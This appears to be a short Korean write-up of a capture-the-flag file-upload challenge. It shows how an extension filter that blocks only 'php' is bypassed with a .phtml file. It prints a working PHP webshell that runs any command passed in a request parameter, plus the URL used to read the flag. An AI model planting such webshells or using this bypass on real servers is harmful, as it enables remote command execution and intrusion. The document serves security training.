# fileupload → 웹쉘

![image.png](image.png)

파일을 업로드 할 수 있는 기능이 제공된다. 

필터링하고 있지만, 대소문자 php만 필터링하고 있기 때문에 .phtml로 웹쉘을 작성해서 올리면 쉘을 획득할 수 있다.

```
<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>

```

웹쉘을 위와 같이 작성한다. 올린 파일에 접속 후 다음과 같은 링크에 접속하면 flag를 획득할 수 있다.

```
http://edu.arang.kr:9501/uploads/webshell_test.phtml?cmd=cat%20/flag_upload.txt
```

![image.png](image%201.png)